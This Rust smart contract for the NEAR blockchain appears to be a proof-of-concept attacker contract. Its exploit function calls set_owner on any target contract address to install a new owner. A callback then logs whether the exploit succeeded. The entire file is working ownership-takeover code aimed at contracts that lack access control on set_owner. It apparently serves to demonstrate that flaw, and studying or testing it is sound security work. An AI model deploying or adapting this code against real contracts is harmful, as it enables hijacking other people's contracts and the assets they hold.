use near_sdk::borsh::{self, BorshDeserialize, BorshSerialize};

use near_sdk::ext_contract;
use near_sdk::{env, near_bindgen, AccountId, Gas, Promise, PromiseError};

pub const TGAS: u64 = 1_000_000_000_000;

#[ext_contract(vulnerable_contract)]
trait Victim {
    fn set_owner(&mut self, new_owner: AccountId);
}

#[near_bindgen]
#[derive(BorshDeserialize, BorshSerialize)]
pub struct Contract {}

impl Default for Contract {
    fn default() -> Self {
        Self {}
    }
}

#[near_bindgen]
impl Contract {
    pub fn exploit(addr: AccountId, owner: AccountId) -> Promise {
        vulnerable_contract::ext(addr.clone())
            .with_static_gas(Gas(30 * TGAS))
            .set_owner(owner)
            .then(
                Self::ext(env::current_account_id())
                    .with_static_gas(Gas(5 * TGAS))
                    .resolve_exploit(),
            )
    }

    #[private]
    pub fn resolve_exploit(&mut self, #[callback_result] result: Result<(), PromiseError>) -> bool {
        if result.is_err() {
            env::log_str(&format!("Exploit failed: {:?}", result.unwrap_err()));
            return false;
        } else {
            env::log_str("Exploit succeeded");
            return true;
        }
    }
}
